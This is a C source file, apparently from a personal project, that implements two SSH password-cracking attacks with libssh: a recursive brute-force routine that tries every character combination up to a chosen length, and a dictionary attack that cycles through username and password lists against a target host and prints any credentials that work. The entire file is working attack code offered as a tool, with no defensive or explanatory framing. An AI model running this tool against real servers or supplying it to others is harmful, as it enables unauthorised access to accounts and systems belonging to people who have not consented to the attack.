/*
 * SSH Attack (C implementation)
 * Author: Priyank Chheda 
 *         E: p.chheda29@gmail.com
 *         W: https://github.com/x899
 *
 * Two Password Cracking Attacks are implemented in this project
 * a. Dictionary Attack
 * b. Brute Force Attack
 *
 */


#include <libssh/libssh.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sshbrute.h"


/**
 * Generate password for specific length
 * and check for authentication
 */
static void
brute_pass(
    char* str,
    int index,
    int maxDepth,
    ssh_session my_ssh_session)
{
    int rc;
    for (int i = 0; i < alphabetSize; ++i)
    {
        str[index] = alphabet[i];

        if (index == maxDepth - 1) {
            printf("[+] Password: %-12s -> ", str); 
            
            rc = ssh_userauth_password(my_ssh_session, NULL, str);
            if (rc == SSH_AUTH_SUCCESS)
            {
                printf("Correct Password\n\n");
                printf("[#] Connected.\n");
                printf("\t[#]Password: %s\n\n", str);
                break;
            }
            else if (rc == SSH_AUTH_AGAIN)
            {
                // if there are too many authentication failure,
                // Exit the program 
                fprintf(
                    stderr,
                    "\n[-] Error authenticating with password:\n%s\n",
                    ssh_get_error(my_ssh_session));
                exit(-1);
            }
            else
                printf("Incorrect Password\n");
        }
        else brute_pass(str, index + 1, maxDepth, my_ssh_session);
    }
}


/**
 * SSH Brute Attack
 * @param target ip/domain name of ssh server
 * @param port ssh server's port
 * @param username array of username
 * @param username_count total number of username
 */
void ssh_brute(
    char* target,
    int port,
    char* username[],
    int username_count)
{
    int rc;

    for (int u = 0; u < username_count; u++)
    {
        ssh_session my_ssh_session = NULL;
        my_ssh_session = ssh_new();
        if (my_ssh_session == NULL)
        {
            printf("[-] SSH Session Failed.\n");
            exit(-1);
        }
        printf("\n\n[*] Username: %s\n", username[u]);

        ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, target);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username[u]);
    
        rc = ssh_connect(my_ssh_session);
        if (rc != SSH_OK)
        {
            fprintf(
                stderr,
                "Error Connecting to server: %s\n",
                ssh_get_error(my_ssh_session));
            ssh_free(my_ssh_session);
            exit(-1);
        }

        int maxLen = 0;
        // enter the lenght of password for brute force
        printf("Enter the lenght of password: ");
        if(scanf("%d", &maxLen) == 1)
        {
            char* buf = malloc(maxLen + 1);
            memset(buf, 0, maxLen + 1);
            brute_pass(buf, 0, maxLen, my_ssh_session);
            free(buf);
        }
        else
            printf("Failed to read integer.\n");
        
        // disconnecting ssh session
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
    }
}


/**
 * SSH Dictionary Attack
 * @param target ip/domain name of ssh server
 * @param port ssh server's port
 * @param username array of username
 * @param username_count total number of username
 * @param password array of password
 * @param password_count total number of password
 */
void ssh_dictionary(
    char* target,
    int port,
    char* username[],
    int username_count,
    char* password[],
    int password_count)
{
    int rc;
    int connected = 0;

    for (int u = 0; u < username_count && connected == 0; u++)
    {
        ssh_session my_ssh_session = NULL;
        my_ssh_session = ssh_new();
        if (my_ssh_session == NULL)
        {
            printf("[-] SSH Session Failed\n");
            exit(-1);
        }
        printf("\n\n[*] Username: %s\n", username[u]);
        
        ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, target);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username[u]);
    
        rc = ssh_connect(my_ssh_session);
        if (rc != SSH_OK)
        {
            fprintf(
                stderr,
                "Error Connecting to server: %s\n",
                ssh_get_error(my_ssh_session));
            ssh_free(my_ssh_session);
            exit(-1);
        }

        for (int p = 0; p < password_count && connected == 0; p++)
        {

            printf("  [+] Password: %-12s -> ", password[p]);
        
            rc = ssh_userauth_password(my_ssh_session, NULL, password[p]);
            if (rc == SSH_AUTH_SUCCESS)
            {
                connected = 1;
                printf("Correct Password\n\n");
                printf("[#] Connected.\n");
                printf("\t[#]Username: %s\n", username[u]);
                printf("\t[#]Password: %s\n\n", password[p]);
            }
            else if (rc == SSH_AUTH_AGAIN)
            {
                // if there are too many authentication failure
                // exit the program 
                fprintf(stderr,
                        "\nError authenticating with password: %s\n",
                        ssh_get_error(my_ssh_session));
                exit(-1);
            }
            else
                printf("Incorrect Password\n");
        }

        // disconnecting ssh session
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);

    }
    
}
